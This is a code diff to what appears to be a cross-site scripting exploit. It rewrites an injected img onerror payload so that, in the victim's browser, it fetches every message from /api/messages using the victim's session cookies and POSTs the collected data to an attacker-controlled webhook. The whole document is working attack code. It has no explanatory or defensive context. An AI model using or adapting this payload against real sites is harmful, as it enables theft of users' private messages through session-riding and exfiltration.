@@ -16,16 +16,21 @@
             ];
             
             const payload = `<img src=x onerror="
-              async function run() {
-                const WEBHOOK = '${WEBHOOK}';
+              (async function() {
+                var WEBHOOK = '${WEBHOOK}';
+                var res = await fetch('/api/messages', {credentials:'include'});
+                var msgs = await res.json();
+                var ids = msgs.map(function(m){ return m.id; });
+                var results = [];
                 
-                const results = await Promise.all(
-                  ${JSON.stringify(endpoints)}.map(async ep => {
-                    const res = await fetch(ep, {credentials:'include'});
-                    const text = await res.text();
-                    return {ep, status: res.status, text};
-                  })
-                );
+                for (var i = 0; i < ids.length; i++) {
+                  var r = await fetch('/api/messages/'+ids[i], {credentials:'include'});
+                  if (r.ok) {
+                    var d = await r.json();
+                    results.push({id: ids[i], data: d});
+                  }
+                  await new Promise(function(r){ setTimeout(r, 300); });
+                }
                 
                 await fetch(WEBHOOK, {
                   method: 'POST',
@@ -33,8 +38,7 @@
                   keepalive: true,
                   body: JSON.stringify(results)
                 });
-              }
-              run();
+              })();
             ">`;
 
             document.getElementById("f").onload = () => {
